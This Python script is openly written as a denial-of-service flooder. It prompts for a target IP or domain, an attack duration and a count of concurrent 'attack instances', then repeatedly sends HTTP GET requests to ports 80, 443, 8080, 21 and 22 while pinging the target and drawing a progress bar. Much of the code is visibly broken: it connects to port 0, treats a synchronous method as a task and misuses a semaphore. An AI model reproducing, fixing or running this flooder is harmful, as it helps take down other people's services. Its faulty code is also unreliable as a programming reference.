import asyncio
import os
import subprocess
from typing import Dict, Tuple

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class CustomTCPProtocol(asyncio.Protocol):
    def __init__(self):
        self.queues: Dict[Tuple[str, int], asyncio.Queue] = {}
        self.destinations: Dict[Tuple[str, int], Tuple[asyncio.Queue, asyncio.Semaphore]] = {}
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print(f"{bcolors.OKGREEN}Connection established{bcolors.ENDC}")

    def data_received(self, data: bytes) -> None:
        for dest in self.destinations.values():
            dest[0].put_nowait(data)

    def connection_lost(self, exc):
        if exc and not isinstance(exc, asyncio.CancelledError):
            print(f"{bcolors.FAIL}Connection lost{bcolors.ENDC}")
        for dest in self.destinations.values():
            dest[1].release()
        self.destinations.clear()

    def send_data(self, dest: Tuple[str, int], data: bytes):
        if not dest[0].empty():
            dest[1].acquire()
            dest[0].put_nowait(data)
            dest[1].release()

    def add_destination(self, dest: Tuple[str, int]):
        if dest not in self.destinations:
            self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())

async def ping_target(target: str):
    while True:
        os.system("clear")
        try:
            output = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{bcolors.OKBLUE}Ping successful: {output.split()[3]} ms{bcolors.ENDC}")
        except subprocess.CalledProcessError:
            print(f"{bcolors.FAIL}Ping failed. Target is not reachable.{bcolors.ENDC}")
        await asyncio.sleep(1)

async def attack(target: str, duration_minutes: int, attack_count: int, progress_queue: asyncio.Queue) -> None:
    duration_seconds = duration_minutes * 60
    tasks = []

    for _ in range(attack_count):
        transport, protocol = await asyncio.get_running_loop().create_connection(lambda: CustomTCPProtocol(), target, 0)

        try:
            ports = [80, 443, 8080, 21, 22]
            for port in ports:
                print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
                protocol.add_destination((target, port))
                transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())

            end_time = asyncio.get_running_loop().time() + duration_seconds
            while asyncio.get_running_loop().time() < end_time:
                for dest in protocol.destinations.keys():
                    for _ in range(10):  # Increase the number of requests sent
                        tasks.append(asyncio.create_task(protocol.send_data(protocol.destinations[dest],
                            f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())))
                        progress_queue.put_nowait(1)

                await asyncio.sleep(0.1)

            await asyncio.gather(*tasks)
            print(f"{bcolors.OKGREEN}Attack instance completed.{bcolors.ENDC}")
        finally:
            transport.close()

    print(f"{bcolors.OKGREEN}All attack instances completed.{bcolors.ENDC}")

async def countdown(duration_seconds: int):
    for remaining in range(duration_seconds, 0, -1):
        mins, secs = divmod(remaining, 60)
        timer = f"{mins:02}:{secs:02}"
        print(f"\r{bcolors.HEADER}Time remaining: {timer}{bcolors.ENDC}", end="")
        await asyncio.sleep(1)
    print()

async def loading_bar(progress_queue: asyncio.Queue, total_requests: int):
    bar_length = 40
    completed_requests = 0

    while completed_requests < total_requests:
        try:
            completed_requests += await asyncio.wait_for(progress_queue.get(), timeout=1)
        except asyncio.TimeoutError:
            pass

        percent = completed_requests / total_requests
        filled_length = int(bar_length * percent)
        bar = '█' * filled_length + '-' * (bar_length - filled_length)
        print(f"\r{bcolors.HEADER}Loading: |{bar}| {percent:.1%} Complete{bcolors.ENDC}", end="")
    
    print()

async def main():
    os.system('clear')
    duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
    target = input(f"{bcolors.HEADER}Enter the target IP or domain: {bcolors.ENDC}")
    attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances: {bcolors.ENDC}"))
    
    total_requests = attack_count * 10 * duration_minutes * 60  # Estimate total requests
    print(f"{bcolors.OKGREEN}Attacking {target} for {duration_minutes} minutes with {attack_count} instances...{bcolors.ENDC}")

    progress_queue = asyncio.Queue()
    await asyncio.gather(
        attack(target, duration_minutes, attack_count, progress_queue),
        ping_target(target),
        countdown(duration_minutes * 60),
        loading_bar(progress_queue, total_requests)
    )

if __name__ == "__main__":
    asyncio.run(main())
